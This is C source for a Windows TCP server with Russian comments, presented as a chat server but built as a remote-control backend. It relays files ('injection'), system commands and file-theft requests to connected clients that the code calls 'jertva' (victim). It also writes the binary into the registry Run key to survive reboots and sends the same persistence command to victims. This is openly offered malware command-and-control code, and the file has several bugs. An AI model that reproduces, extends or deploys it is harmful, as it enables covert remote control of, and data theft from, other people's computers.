#include<winsock2.h>
#include<windows.h>
#include<ws2tcpip.h>
#include<iphlpapi.h>
#include<stdio.h>
//gcc server.c -L./C:\Windows\System32 -lws2_32 -o a0.exe
#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#define PORT        "3269"
#define MAX         200
#define HIP          5
#define US_NAME     15
#define US_PASSWORD 15
#define US_HLAM     30
#define MAXPEOPLE   10
#define FILEBUF     300000
#define FILENAME    50
#define COM         100
#define COMMAND     100

struct user {
    SOCKET us_socket;
    char us_name[US_NAME];
    char us_password[US_PASSWORD];
    char us_hlam[US_HLAM];
};

struct disp {
    SOCKET  dis_name;          //идентификатор сокета
    char    dis_flag;         //ячейка для хранения состояния флага
    //char    dis_status;    //свободен или нет
};

struct inj {
    SOCKET  inj_socket;
    char    inj_name[US_NAME];     //имя адрeсанта;
    char    inj_file[FILENAME];    //имя файла отправки;
    int     inj_filesize;
};

struct inj  letter[MAXPEOPLE];           //массив со структурами inj для injection();
struct disp injec[MAXPEOPLE];
struct disp regis[MAXPEOPLE];
struct user cat_users[MAXPEOPLE];       // тассив со структурами user (логины, пароли, и др.);

int dispatcher(SOCKET sock);
int check_root(SOCKET sock);
void clean_sockets();
int registration(SOCKET sock_fd);
int dis_isset(SOCKET a, struct disp *b);
void dis_set(SOCKET a, struct disp *b, char flag);
void dis_clr(SOCKET a, struct disp *b);
int log_set(SOCKET sockfd, char *buf);
int pass_set(SOCKET sockfd, char *buf);
int add_log(SOCKET sock, char *buf);
int load_struct(char *filename, void *mass);
int save_struct(char *filename, void *mass, int size);

int injection(SOCKET fd_socket);
int filename_set(char *bufin_a, char *bufin_b, char *bufout, int size);
int file_set(char *file_name, void *bufout, int size);
int file_size(char *buf, int *filesize, int size_buf);
int inj_log_set(SOCKET sockfd, char *name, char *fname, int size);
int inj_name_load(SOCKET socket, char *name, char *fname, int *size);
int detect_sock(char *name);

int entrance(SOCKET sockfd);
int name_passw_set(char *user, char *passw, char *buf);
int check_user(SOCKET sock, char *user_name, char *passw);

int still(SOCKET sock);
int st_info_set(char *fname, char *to_name, char *from_name, char *buf);

int sys(SOCKET sock);

int autorun_on(SOCKET sock);
int autorun_off(SOCKET sock);

char *filename = "cat_users.dat";
//char buf[MAX];
//char *buf_cl;
char *buf;                   //обрезаем буффер file;
char file[FILEBUF];         //основной буффер приёма/отправки;
char fuse;                 //флаг "предохранитель" для того, чтобы send(в конце main) не выполнялось для всех клиентов;

//SOCKET serv_socket;

int main() {
    struct addrinfo hints, *res, *p;
    struct sockaddr_storage their_addr;
    struct fd_set master, read_fd;
    int addrlen;
    SOCKET sockfd, newfd, fdmax, i, j;
    WSADATA wsaData;
    int rev, nbutes;
    char *server = "serv";

    int rez = WSAStartup(MAKEWORD(2,2), &wsaData); 
    if(rez != 0) {
        printf("Error: WSAStartup = %d\n", rez);
        return 1;  
    }

    res = NULL;
    p = NULL;
    sockfd = INVALID_SOCKET;
    newfd = INVALID_SOCKET;
    fdmax = INVALID_SOCKET;

    FD_ZERO(&master);
    FD_ZERO(&read_fd);

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_flags = AI_PASSIVE;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if(load_struct(filename, cat_users) != 0) {
        printf("File %s not exist\n", filename);
    }

    clean_sockets();
    //asd();
    //off();

    rev = getaddrinfo(NULL, PORT, &hints, &res);
    if(rev != 0) {
        printf("getaddrinfo faild: %d\n", rev);
        return 1;
    }
        p = res;
    for(p = res; p!=NULL; p->ai_next) {
        printf("socket...\n");
        sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sockfd == INVALID_SOCKET) {
            printf("Error socket: %ld\n", WSAGetLastError());
            //continue;
            freeaddrinfo(res);
            WSACleanup();
            return 1;
        }
        printf("Socket: OK\n");

        if(bind(sockfd, p->ai_addr, p->ai_addrlen) == SOCKET_ERROR) {
            printf("Bind listener socket(%d): faild", sockfd);
            closesocket(sockfd);
            return 1;
           // continue;
        }
        break;
   }
    printf("Bind(%d):OK\n", sockfd);
    if(p == NULL) {
        printf("Creat socket is faild\n");
        return 1;
    }
    
    if(listen(sockfd, HIP) == -1) {
        printf("Error listen\n");
        exit(3);
    }
    printf("Listen: Ok\n");

    freeaddrinfo(res);
    //serv_socket = sockfd;

    FD_SET(sockfd, &master);
    fdmax = sockfd;

    if(log_set(sockfd, server) == 1)  {
        printf("User '%s' was initialized\n", server);
    }
    printf("User '%s' was registered\n", server);

    //autorun_on(sockfd);

    for(;;) {
        read_fd = master;
        fuse = 0;

        printf("select...\nCircle_1\n");
        if(select(fdmax+1, &read_fd, NULL, NULL, NULL) == -1) {
            printf("Error select: %ld\n", WSAGetLastError());
            WSACleanup();
            exit(4);
        }
        printf("Select:OK\n Circle_2\n");

        for(i = 0; i <= fdmax; i++) {
            if(FD_ISSET(i, &read_fd)) {
                if(i == sockfd) {

                    printf("accept...\n");
                    addrlen = sizeof(their_addr);
                    newfd = accept(sockfd, (struct sockaddr *)&their_addr, &addrlen);
                    if(newfd == -1) {
                        printf("Error accept\n");
                    }
                    else {
                        printf("Accept(%d): OK\n", newfd);
                        FD_SET(newfd, &master);
                        if(newfd > fdmax) {
                            fdmax = newfd;
                        }
                    }
                }
                else{
                    printf("recive...\n");
                    nbutes = recv(i, file, sizeof(file), 0);
                    if(nbutes <= 0 ) {
                        if(nbutes == 0) {
                            printf("socket %d hung up\n", i);
                        }
                        else {
                            printf("Error recv\n");
                        }
                        closesocket(i);
                        FD_CLR(i, &master);
                    }
                    else {
                        printf("receive(%d): OK\n", nbutes);
                        dispatcher(i);

                        printf("Circle_3\n");
                        if(fuse == 0) {
                            for(j = 0; j <= fdmax; j++) {
                                    if(FD_ISSET(j, &master)) {
                                        printf("J ISSET\n");
                                        if(j != sockfd && j != i) {
                                            printf("send...");
                                            if(send(j, buf, nbutes, 0) == -1) {
                                                printf("Error send\n");
                                            }
                                            printf("Send: end\n");
                                        }
                                    }
                            }
                        }   
                    }
                }

            }
        }


    }
        WSACleanup();
        printf("...end\n");

    return 0;
}

int dispatcher(SOCKET sock) {
    char *save_struct_ok = "save_struct(): OK\n";
    char *save_struct_faild = "save_struct(): FAILD\n";

    int size = sizeof(cat_users);

    buf = file;
    //
    char * vc;
   //
    printf("in dispatcher\n");

        if(dis_isset(sock, &regis)) {
            registration(sock);
        }

        if(dis_isset(sock, &injec)) {
            injection(sock);
        }

        printf("in disp select\n");
//-------------------------------------------------------------------------------------------------------
        if(buf[3]== '-' && buf[4]== 'i') {  //buf[0]=='-' buf[1]=='s' buf[2]=='space'
           if (registration(sock) != 0) {
            printf("Registration is failded");
            return 1;
           }

        }
//------------------------------------------------------------------------------------------------------
        if(buf[3]== '&' && buf[4]== 's' && buf[5]== 'a' && buf[6]== 'v' && buf[7]== 'e') {
            if(check_root(sock) == 0) {
                if(save_struct(filename, cat_users, size) != 0) {
                    send(sock, save_struct_faild, (int)strlen(save_struct_faild), 0);
                }
                else {
                    send(sock, save_struct_ok, (int)strlen(save_struct_ok), 0);
                }
            }
        }
//-------------------------------------------------------------------------------------------------------
        if(buf[3]== '&' && buf[4]== 'i' && buf[5]== 'n' && buf[6]== 'j') {
            if(check_root(sock) == 0) {
                printf("In injection...\n");
                injection(sock);
            }
        }
        if(buf[3]== '&' && buf[4]== 's' && buf[5]== 't' && buf[6]== 'i' && buf[7]== 'l' && buf[8]== 'l') {
            if(check_root(sock) == 0) {
                printf("In still...\n");
                still(sock);
            }
        }
//-------------------------------------------------------------------------------------------------------
        if(buf[3]== '&' && buf[4]== 's' && buf[5]== 'y' && buf[6]== 's') {
            if(check_root(sock) == 0) {
                printf("In sys...\n");
                sys(sock);
            }
        }
        if(buf[3]== '&'  && buf[4]== 'r' && buf[5]== 'u' && buf[6]== 'n' && buf[7]== '_' && buf[8]== 'o') {
            if(check_root(sock) == 0) {
                if(buf[9]== 'n') {
                    printf("In autorun_on...\n");
                    autorun_on(sock);
                }
                else if(buf[9]== 'f') {
                    printf("In autorun_off...\n");
                    autorun_off(sock);
                }
            }
        }
//-------------------------------------------------------------------------------------------------------
        if(buf[3]== '-' && buf[4]== 'e' && buf[5]== 'n' && buf[6]== 't') {
            printf("In entrance...\n");
            if(entrance(sock) == 1) {
                printf("Error entrance()\n");
            }
        }
//-------------------------------------------------------------------------------------------------------
        //
        printf("Assign the name\n");
        add_log(sock, buf); 
        vc = buf;
        vc += MAX - US_NAME;
        printf("Login: %s\n", vc);        
        //      
        printf("out dispatcher\n");
    return 0;
}

int check_root(SOCKET sock) {
    char *no_root = "You have not root! ";

    for(int i = 0; i < MAXPEOPLE; i++) {
        if(cat_users[i].us_socket == sock) {
            return 0;
        }
    }
    send(sock, no_root, (int)strlen(no_root), 0);
    return 1;
}

void clean_sockets() {
    for(int i = 0; i < MAXPEOPLE; i++) {
        cat_users[i].us_socket = 0;
    }
}

int registration(SOCKET sock_fd) {
        char *ent_name = "Enter you login";
        char *ent_password = "Enter you password";
        char *st_faild_reg = "Faild";
        char *st_ok_reg = "successfully";
        char *rep_login = "This login alredy exists. Try again. Send '-i'";
        char *rep_password = "Error fined socket. Try again. Send '-i'";
        char *buf_cl;
        char flag_reg;
        int rb;

        buf_cl = buf;
        buf_cl += 3;

        printf("in registration\n");
        for(int i = 0; i < MAXPEOPLE; i++) {
            if(regis[i].dis_name == sock_fd) {
                flag_reg = regis[i].dis_flag;
                break;
            }
        }

        if(flag_reg == 1) {
            if(buf_cl[0] == 0) {
                if((rb = send(sock_fd, st_faild_reg, (int)strlen(st_faild_reg), 0)) == -1) {
                    printf("Error receive: ent_password from disp.registration\n");
                    flag_reg = 0;
                    dis_clr(sock_fd, &regis);
                    return 1;
                }
            }
            else {
                // обработка login;
                if(log_set(sock_fd, buf_cl) == 1) {
                    if((rb = send(sock_fd, rep_login, (int)strlen(rep_login), 0)) == -1) {
                        printf("Error send: rep_login\n");
                    }
                    dis_clr(sock_fd, &regis);
                    return 2;
                }
                if((rb = send(sock_fd, ent_password, (int)strlen(ent_password), 0)) == -1) {
                    printf("Error send: ent_password from disp.registration\n");
                    return 1;
                }
                else {
                    printf("request password(ent_password) from disp.registration() to %d\n", sock_fd);
                    flag_reg = 2;
                    dis_set(sock_fd, &regis, flag_reg);
                }
            }
        }
        else if(flag_reg == 2) {
            if(buf_cl[0]== 0) {
                if((rb = send(sock_fd, st_faild_reg, (int)strlen(st_faild_reg), 0)) == -1) {
                    printf("Error send: st_faild_reg\n");
                    flag_reg = 0;
                    dis_clr(sock_fd, &regis);
                }
            }
            else {
                //обработка password;
                if(pass_set(sock_fd, buf_cl) == 1) {
                    if((rb = send(sock_fd, rep_password, (int)strlen(rep_password), 0)) == -1) {
                        printf("Error send: rep_password\n");
                    }
                    dis_clr(sock_fd, &regis);
                    return 3;
                }
                if((rb = send(sock_fd, st_ok_reg, (int)strlen(st_ok_reg), 0)) == -1) {
                    printf("Error send: st_ok_reg\n");
                }
                else {
                    flag_reg = 0;
                    dis_clr(sock_fd, &regis);
                    printf("Registration(%d): OK\n", sock_fd);
                }
            }
        }
        else {
             if((rb = send(sock_fd, ent_name, (int)strlen(ent_name), 0)) == -1) {
                 printf("Error send: ent_name from disp.registration\n");
                 flag_reg = 0;
                 return 1;
            } 
            else {
                flag_reg = 1;
                dis_set(sock_fd, &regis, flag_reg);
            //if(flag_disp == 0) {
              //  flag_disp = flag_disp + (char)1;
            //}
                printf("request login(ent_name) from disp.registrtion() to %d\n", sock_fd);
            }
        }

    fuse = 1;
    return 0;
}

void dis_set(SOCKET a, struct disp *b, char flag) {
    for(int i = 0; i < MAXPEOPLE; i++) {
        if((b[i].dis_name == (SOCKET)0) || (b[i].dis_name == a)) {
            b[i].dis_name = a;
            b[i].dis_flag = flag;
            return;
        }
    }
    printf("ERROR dis_set: %ld\n", b);
}

void dis_clr(SOCKET a, struct disp *b) {
    for(int i = 0; i < MAXPEOPLE; i++) {
        if(b[i].dis_name == a) {
            ZeroMemory(&b[i], sizeof(struct disp));
            return;
        }
    }
    printf("ERROR dis_clr\n");
}

void inj_clr(SOCKET a, struct inj *b) {
    for(int i = 0; i < MAXPEOPLE; i++) {
        if(b[i].inj_socket == a) {
            ZeroMemory(&b[i], sizeof(struct inj));
            return;
        }
    }
    printf("ERROR inj_clr\n");
}

int dis_isset(SOCKET a, struct disp *b) {
    for(int i = 0; i < MAXPEOPLE; i++) {
        if(b[i].dis_name == a) {
            return 1;
        }
        else {
            return 0;
            }
    }
}

int log_set(SOCKET sockfd, char *buf){
    for(int i = 0; i < MAXPEOPLE; i++) {
        if(cat_users[i].us_name[0] == 0) {
            for(int j = 0; j < US_NAME; j++) {
                cat_users[i].us_name[j] = buf[j];
            }
            cat_users[i].us_socket = sockfd;
            return 0;
        }
        else {
            for(int c = 0; c < US_NAME; c++) {
                if(cat_users[i].us_name[c] != buf[c]) {
                    break;
                }
                else if(cat_users[i].us_name[c] == buf[c]) {
                    printf(".");
                    if(c == US_NAME -1) {
                        return 1;                   //такой логин существует;
                    }
                    continue;
                }
            }
        }
    }
}

int pass_set(SOCKET sockfd, char *buf) {
    for( int i = 0; i < MAXPEOPLE; i++) {
        if(cat_users[i].us_socket == sockfd) {
            for(int j = 0; j < US_PASSWORD; j++) {
                cat_users[i].us_password[j] = buf[j];
            }
            return 0;
        }
    }
    return 1;                       //не удалось найти соответствующий socketfd;
}

int add_log(SOCKET sock, char *buf) {
    
    for(int i = 0; i < MAXPEOPLE; i++) {
        if(cat_users[i].us_socket == sock) {
            for(int j = 0; j < US_NAME; j++) {
                buf[MAX - US_NAME + j] = cat_users[i].us_name[j];
            }
            return 0;
        }
    }
    return 1;           //не найден пользователь с таким socket;
}

int load_struct(char *filename, void *mass) {
    FILE *fp;
    int i;
    char *c;
    
    if((fp = fopen(filename, "r")) == NULL) {
        printf("Error open file '%s'\n", filename);
        return 1;
    }

    c = (char *)mass;

    while((i = getc(fp)) != EOF) {
        *c = i;
        c++;
    }
    fclose(fp);
    return 0;
}

int save_struct(char *filename, void *mass, int size) {
    FILE *fp;
    char *c;

    if((fp = fopen(filename, "wb")) == NULL) {
        printf("Error save in file '%s'\n", filename);
        return 1;
    }

    c = (char *)mass;

    for(int i = 0; i < size; i++) {
        putc(*c, fp);
        c++;
    }
    fclose(fp);

    fuse = 1;
    return 0;
}
//==========================================================================================
int injection(SOCKET fd_socket) {
    SOCKET inj_sock;

    char *filename_error = "File name is too big. Try again. ";
    char *filename_ok = "File name saved successfully. ";
    char *ent_error = "incorrect input. Try again. ";
    char *file_set_ok = "File saved successfully. ";
    char *inj_cli_ok = "Injection was sent successfully! ;( ";

    char *buf_rez;
    char flag_inj;

    char com[COM];
    char file_name[FILENAME];
    char us_nam[US_NAME];

    int var;
    int filesize;
    int sizename = sizeof(file_name);
   
    buf_rez = buf;
    buf_rez += 8;
    com[0] = '&';
    com[1] = 'i';
    com[2] = 'n';
    com[3] = 'j';

    char *c;
    c = (char *)filesize;
    printf("in injection\n");

    for(int i = 0; i < MAXPEOPLE; i++) {
        if(injec[i].dis_name == fd_socket) {
            flag_inj = injec[i].dis_flag;
            break;
        }
    }

    if(flag_inj == 1) {
        printf("if flag_inj == 1\n");
        if(file[0] == 0) {
            printf("send Error");
            if(send(fd_socket, ent_error, (int)strlen(ent_error), 0) == -1) {
               printf("Error send(ent_error)-> injection->flag = 1");
            }
            dis_clr(fd_socket, &injec);
            return 1;
        }
        else { 
            printf("data of file\n");
            //обработка данных файла;
            if((var = inj_name_load(fd_socket, us_nam, file_name, &filesize)) != 0) {
                    printf("inj_name_load(%d)\n", var);
                }
            printf("%s, %s, %d\n", us_nam, file_name, filesize);

            if(us_nam[0] != 's' || us_nam[1] != 'e' || us_nam[2] != 'r' || us_nam[3] != 'v' || us_nam[4] != '\0') {
                inj_sock = detect_sock(us_nam);
                
                var = 4;
                for(int i = 0; i < COM; i++) {
                    com[i+4] = file_name[i];
                    if(file_name[i] != '\0') {
                        continue;
                    }
                    var += ++i;
                    printf("var: %d\n", var);
                    break;
                }
    
                add_file_size(com, &filesize, var);
                printf("In file_name: %s, size: %d\n", file_name, filesize);

                if(send(inj_sock, com, COM, 0) == -1) {
                    printf("Error send com to %s\n", us_nam);
                }
                printf("Send com\n");

                if(send(inj_sock, file, filesize, 0) == -1) {
                    printf("Error send file to %s\n", us_nam);
                }
                if(send(fd_socket, inj_cli_ok, (int)strlen(inj_cli_ok), 0) == -1) {
                    printf("Error send inj_cli_ok\n");
                }
                dis_clr(fd_socket, &injec);
                inj_clr(fd_socket, &letter);
                printf("Send injection to users with socket(%d): OK\n", inj_sock);
            }
            else if(file_set(file_name, file, filesize) == 0) {
                    if(send(fd_socket, file_set_ok, (int)strlen(file_set_ok), 0) == -1) {
                        printf("Error send(file_set_ok)->injection->flag = 1\n");
                    }
                    dis_clr(fd_socket, &injec);
                }   
            else {
                dis_clr(fd_socket, &injec);
                printf("Faild save file\n");
            }
        }
    }
    else {
        if(buf_rez[0] == 0) {
            if(send(fd_socket, ent_error, (int)strlen(ent_error), 0) == -1) {
                printf("Error send(ent_error)->injection->flag = 0\n");
            }
            dis_clr(fd_socket, &injec);
            return 1;
        }
        else {
            file_size(buf, &filesize, MAX);
            if(filename_set(file_name, us_nam, buf_rez, sizeof(file_name)) != 0) {
                if(send(fd_socket, filename_error, (int)strlen(filename_error), 0) == -1) {
                    printf("Error send(filename_error)->injection->flag = 0\n");
                }
                dis_clr(fd_socket, &injec);
            }
            else {
                if((var = inj_log_set(fd_socket, us_nam, file_name, filesize)) == 0) {
                    printf("inj_log_set(%d)\n", var);
                    if(send(fd_socket, filename_ok, (int)strlen(filename_ok), 0) == -1) {
                        printf("Error send(filename_ok)->injection->flag = 0\n");
                    }
                    flag_inj = 1;
                    dis_set(fd_socket, &injec, flag_inj);
                    printf("file name: %s\nFile size: %d\nus_nam: %s\nflag_inj: %d\n", file_name, filesize, us_nam, flag_inj);
                }
            }
        }
    }

    fuse = 1;
    return 0;
}

int add_file_size(char *buf, int *filesize, int add_buf) {
    char *c;
    c = (char *)filesize;

    for(int i = 0; i < sizeof(int); i++) {
        buf[add_buf + i] = *c;
        c++;
    }
    return 0;
}    

int filename_set(char *bufin_a, char *bufin_b, char *bufout, int size) {
    for(int i = 0; i < size; i++) {
        bufin_a[i] = bufout[i];
        if(bufout[i] == ' ') {
            bufin_a[i] = '\0';
            i++;
            for(int j = 0; j < US_NAME; j++) {
                bufin_b[j] = bufout[i+j];
                if(bufout[i+j] == '\0') {
                    return 0;
                }
            }
            return 2;        //размер логина слишкоми большой;
        }
    }
    return 1;               // размер имени файла слишком большой;
}

int file_size(char *buf, int *filesize, int size_buf) {
    char *a;
    a = (char *)filesize;

    for(int i = 0; i < sizeof(int); i++) {
        *a = buf[size_buf-sizeof(int) + i];
        a++;
    }
    return 0;
}

int file_set(char *file_name, void *bufout, int size) {
    FILE *fp;
    char *c;
    
    if((fp = fopen(file_name, "wb")) == NULL) {
        //printf("Error file_set()\n");
        perror("Error occured while opening file");
        return 1;
    }

    c = (char *)bufout;
    for(int i = 0; i < size; i++) {
        putc(*c, fp);
        c++;
    }
    
    fclose(fp);
    return 0;
}

int inj_log_set(SOCKET sockfd, char *name, char *fname, int size) {
    for(int i = 0; i < MAXPEOPLE; i++) {
        for(int j = 0; j < US_NAME; j++) {
            if(cat_users[i].us_name[j] != name[j]) {
                break;
            }
            else if(cat_users[i].us_name[j]  == name[j]) {
                if(name[j] == '\0') {
                    for(int c = 0; c < MAXPEOPLE; c++) {
                        if(letter[c].inj_name[0] == 0) {
                            for(int d = 0; d < US_NAME; d++) {
                                letter[c].inj_name[d] = name[d];
                                if(name[d] == '\0') {
                                    break;
                                }
                            }
                            for(int b = 0; b < FILEBUF; b++) {
                                letter[c].inj_file[b] = fname[b];
                                if(fname[b] == '\0') {
                                    break;
                                }
                            }
                            letter[c].inj_filesize = size;
                            letter[c].inj_socket = sockfd;
                            return 0;
                        }
                    }
                    return 2;       //нет свободных структур для логина;
                }
                continue;
            }
        }
    }
    return 1;           //не существует такого логина;
}

int inj_name_load(SOCKET socket, char *name, char *fname, int *size) {
    for(int i = 0; i < MAXPEOPLE; i++) {
        if(letter[i].inj_socket == socket) {
            for(int j = 0; j < US_NAME; j++) {
                name[j] = letter[i].inj_name[j];
                if(letter[i].inj_name[j] == '\0') {
                    break;
                }
            }
            for(int c = 0; c < FILEBUF; c++) {
                fname[c] = letter[i].inj_file[c];
                if(letter[i].inj_file[c] == '\0') {
                    break;
                }
            }
            *size = letter[i].inj_filesize;
            return 0;
        }
    }
    return 1;       
}

int detect_sock(char *name) {
    SOCKET sock;
    for(int i = 0; i < MAXPEOPLE; i++) {
        for(int j = 0; j < MAXPEOPLE; j++) {
            if(cat_users[i].us_name[j] != name[j]) {
                break;
            }
            if(name[j] == '\0') {
                sock = cat_users[i].us_socket;
                return sock;
            }
        }
    }
    return 1;
}
//===========================================================================================
int entrance(SOCKET sockfd){

    char *check_faild = "This name or login are not exist";
    char *check_ok = "You entrance in account ";

    char password[US_PASSWORD];
    char user_name[US_NAME];
    char *ent_buf;

    ent_buf = buf;
    ent_buf += 8;

    name_passw_set(user_name, password, ent_buf);
    printf("user_name: %s; password: %s\n", user_name, password);

    if(check_user(sockfd, user_name, password) == 0) {
        if(send(sockfd, check_ok, (int)strlen(check_ok), 0) == -1) {
            printf("Error entrance()-> send 'check_ok'\n");
        }
    }
    else {
        if(send(sockfd, check_faild, (int)strlen(check_faild), 0) == -1) {
            printf("Error entrance()-> send 'check_faild'\n");
        }
        return 1;
    }

    printf("check_uset: OK\n");
    fuse = 1;
    return 0;
}

int name_passw_set(char *user, char *passw, char *buf) {
    for(int i = 0; i < US_NAME; i++) {
        user[i] = buf[i];
        if(buf[i] == ' ') {
            user[i] = '\0';
            i++;
            for(int j = 0; j < US_PASSWORD; j++) {
                passw[j] = buf[i+j];
                if(buf[i+j] != '\0') {
                    continue;
                }
                return 0;
            }
            return 2;   //пароль слишком длинный;
        }
    }
    return 1;       //имя клиета слишком большое;
}

int check_user(SOCKET sock, char *user_name, char *passw) {
    for(int i = 0; i < MAXPEOPLE; i++) {
        for(int j = 0; j < US_NAME; j++) {
            if(cat_users[i].us_name[j] != user_name[j]) {
                break;
            }
            if(cat_users[i].us_name[j] == '\0') {
                for(int c = 0; c < US_PASSWORD; c++) {
                    if(cat_users[i].us_password[c] != passw[c]) {
                        break;
                    }
                    if(cat_users[i].us_password[c] == '\0') {
                        cat_users[i].us_socket = sock;
                        return 0;
                    }
                }
                //return 2;           //логин сущeствует, а пароль нет;
            }
        }
    }
    return 1;       //не существует логина;

}

int still(SOCKET sock) {
    SOCKET us_sock;
    char fname[FILENAME];
    char name[US_NAME];
    char to_name[US_NAME];
    int fsize;

    char *sti_buf;
    sti_buf = buf;

    sti_buf[0] = '&';
    sti_buf[1] = 's';
    sti_buf[2] = 't';
    sti_buf[3] = 'i';
    sti_buf[4] = 'l';
    sti_buf[5] = 'l';

    sti_buf += 10;

    st_info_set(fname, to_name, name, sti_buf);
    us_sock = detect_sock(name);
    printf("fname: %s, to_name: %s, name: %s\n", fname, to_name, name);
  
        if(send(us_sock, buf, MAX, 0) == -1) {
            printf("Error send to jertva\n");
        }
    printf("still: OK\n");
    fuse = 1;
    return 0;
}

int st_info_set(char *fname, char *to_name, char *from_name, char *buf) {
    char *c;
    c = (char *)file_size;

    for(int i = 0; i < FILENAME; i++) {
        fname[i] = buf[i];
        if(buf[i] != ' ') {
            continue;
        }
        fname[i] = '\0';
        i++;
        for(int j = 0; j < US_NAME; j++) {
            to_name[j] = buf[i+j];
            if(buf[i+j] != ' ') {
                continue;
            }
            to_name[j] = '\0';
            i++;
            for(int c = 0; c < US_NAME; c++) {
                from_name[c] = buf[i+j+c];
                if(buf[i+j+c] != '\0') {
                    continue;
                }
            }
            return 0;
        }
        return 2;
    }
    return 1;
}
//======================================================================================================
int sys(SOCKET sock) {
    char *sys_ok = "Command was send successfully. ";
    SOCKET us_sock;
    char command[COMMAND];
    char name[US_NAME];

    char *sys_buf;
    sys_buf = buf;

    sys_buf[0] = '&';
    sys_buf[1] = 's';
    sys_buf[2] = 'y';
    sys_buf[3] = 's';

    sys_buf += 8;

    sys_set(command, name, sys_buf);
    us_sock = detect_sock(name);
    printf("command: %s; name: %s\n", command, name);

    //sys_load(command, sys_buf);
    if(send(us_sock, buf, MAX, 0) == -1) {
        printf("Error send to jertva in sys()\n");
        return 1;
    }
    send(sock, sys_ok, (int)strlen(sys_ok), 0);
    printf("sys(): OK\n");

    fuse = 1;
    return 0;
}

int sys_load(char *com, char *buf) {
    for(int i = 0; i < COMMAND; i++) {
        buf[i] = com[i];
        if(com[i] != ',') {
            continue;
        }
        return 0;
    }
    return 1;
}

int sys_set(char *com, char *name, char *buf) {
    for(int i = 0; i < COMMAND; i++) {
        com[i] = buf[i];
        if(buf[i] != ',') {
            continue;
        }
        com[i] = '\0';
        i += 2;
        for(int j = 0; j < US_NAME; j++) {
            name[j] = buf[i+j];
            if(buf[i+j] != '\0') {
                continue;
            }
            return 0;
        }
        return 2;
    }
    return 1;
}
//=======================================================================================================
int autorun_on(SOCKET sock) {
    HKEY hKeys; 
    SOCKET r_sock;
    //DWORD dwtype = 0;
    //DWORD dwBufsize = sizeof(autorun);
    //TCHAR szpath[MAX_PATH]; 
    //char autorun[255] = "C:\\Users\\parfi\\Desktop\\C\\chat\\a0.exe"; 
    char *run_ok = "Autorun send to jertva successfully. ";
    char autorun[255];
    char name[US_NAME];
    char *run_buf = buf;
    run_buf += 11;

    for(int i = 0; i < US_NAME; i++) {
        name[i] = run_buf[i];
        if(run_buf[i] != '\0') {
            continue;
        }
    }

    printf("jertva: %s\n", name);

    if(name[0] == 's' && name[1] == 'e' && name[2] == 'r' && name[3] == 'v' && name[4] == '\0') {
        GetModuleFileName(NULL, autorun, sizeof(autorun));
        if(ERROR_SUCCESS==RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,0,KEY_ALL_ACCESS, NULL,&hKeys,NULL)){
            printf("ERROR_SUCCESS:%d\n", ERROR_SUCCESS);

            RegSetValueEx(hKeys,"a0.exe",0,REG_SZ, (char *)autorun,sizeof(autorun));
            RegCloseKey(hKeys);
            printf("autorun: OK\n");
        }
    }
    else {
        printf("to jertva\n");
        buf[0] = '&';
        buf[1] = 'r';
        buf[2] = 'n';

        if((r_sock = detect_sock(name)) == 1) {
            printf("user isnt exists\n");
            return 1;
        }
        if(send(r_sock, buf, MAX, 0) == -1) {
            printf("Error send autorun to jertva\n");
        }
        if(send(sock, run_ok, (int)strlen(run_ok), 0) == -1) {
            printf("Error send run_ok\n");
        }
    }

    fuse = 1;
    return 0;
}

int autorun_off(SOCKET sock) {
    HKEY hKey; 
    SOCKET r_sock;

    char *run_off_ok = "Autorun OFF from jertva: OK. ";
    char autorun[255];
    char name[US_NAME];
    char *run_buf = buf;
    run_buf += 11;

    for(int i = 0; i < US_NAME; i++) {
        name[i] = run_buf[i];
        if(run_buf[i] != '\0') {
            continue;
        }
    }
    printf("Jertva: %s\n", name);

    if(name[0] == 's' && name[1] == 'e' && name[2] == 'r' && name[3] == 'v' && name[4] == '\0') {
        GetModuleFileName(NULL, autorun, sizeof(autorun));
        if(ERROR_SUCCESS==RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,0,KEY_ALL_ACCESS, NULL,&hKey,NULL)){
            printf("ERROR_SUCCESS:%d\n", ERROR_SUCCESS);

            RegDeleteValueA(hKey, "a0.exe");
            RegCloseKey(hKey);
            printf("autorun_off: OK\n");
        }
    }
    else {
         printf("to jertva\n");
        buf[0] = '&';
        buf[1] = 'r';
        buf[2] = 'f';

        if((r_sock = detect_sock(name)) == 1) {
            printf("user isnt exists\n");
            return 1;
        }
        if(send(r_sock, buf, MAX, 0) == -1) {
            printf("Error send autorun to jertva\n");
        }
        if(send(sock, run_off_ok, (int)strlen(run_off_ok), 0) == -1) {
            printf("Error send run_off_ok\n");
        }
    }
    return 0;
}

int asd(){
char autorun[255] = "C:\\Users\\parfi\\Desktop\\C\\chat\\a0.exe";
DWORD dwtype = 0;
DWORD dwBufsize = sizeof(autorun);
TCHAR szpath[MAX_PATH];           
HKEY hKeys;
if(ERROR_SUCCESS==RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,0,KEY_ALL_ACCESS, NULL,&hKeys,NULL))
{
RegSetValueEx(hKeys,"a0.exe",0,REG_SZ, (char *)autorun,sizeof(autorun));
RegCloseKey(hKeys);               
}
}

int off(SOCKET sock) {
    HKEY hKey; 
    SOCKET r_sock;
    char autorun[255];

    if(ERROR_SUCCESS==RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,0,KEY_ALL_ACCESS, NULL,&hKey,NULL)){
        printf("ERROR_SUCCESS:%d\n", ERROR_SUCCESS);

        RegDeleteValueA(hKey, "a0.exe");
        RegCloseKey(hKey);
        printf("autorun_off: OK\n");
    }
    return 0;
}